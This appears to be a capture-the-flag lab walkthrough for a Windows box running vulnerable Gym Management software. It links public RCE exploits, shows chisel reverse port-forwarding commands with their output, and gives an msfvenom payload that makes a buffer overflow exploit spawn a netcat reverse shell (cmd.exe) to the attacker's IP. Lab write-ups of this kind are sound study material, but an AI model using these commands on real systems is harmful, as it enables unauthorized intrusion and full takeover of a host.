The website is being run by a vulnerable version of gym management. Using the following tool we can gain RCE: https://github.com/0xConstant/Gym-Management-1.0-unauthenticated-RCE.git
![[Pasted image 20240425202150.png]]

The payload didn't get a nice shell so we used msfconsole exploit from here: https://github.com/Zeop-CyberSec/gym_mgmt_system_unauth_rce

# Windows Priv Esc
Once you are on the box you see a interesting file in the downloads of shaun which you find to be vulnerable to buffer overflow. You then need to portforward the process it listens on 8888.

## Portforwarding with chisel

### Attack Host
```shell
─$ chisel server -p 9999 --reverse
2024/04/26 01:59:44 server: Reverse tunnelling enabled
2024/04/26 01:59:44 server: Fingerprint cfIv3SG+tVEk98rrUApFLkcNFuIxaLvrLQWj81+DH9Y=
2024/04/26 01:59:44 server: Listening on http://0.0.0.0:9999
2024/04/26 02:01:12 server: session#1: Client version (1.9.1) differs from server version (1.9.1-0kali1)
2024/04/26 02:01:12 server: session#1: tun: proxy#R:8888=>8888: Listening
```

### Windows Victim
```powershell
PS C:\xampp\htdocs\gym\upload> .\chisel.exe client 10.10.14.3:9999 R:8888:127.0.0.1:8888

.\chisel.exe client 10.10.14.3:9999 R:8888:127.0.0.1:8888
2024/04/26 07:01:56 client: Connecting to ws://10.10.14.3:9999
2024/04/26 07:01:56 client: Connected (Latency 25.3646ms)

```

Once you have setup the port forward you need to download the exploit from https://www.exploit-db.com/raw/48389
Replace the default payload with the following:
```shell
─$ msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc64.exe -e cmd.exe 10.10.14.3 9897' -b '\x00\x0a\x0d' -f python -v payload
```
Then just setup a netcat listener and hit run and you get Administrator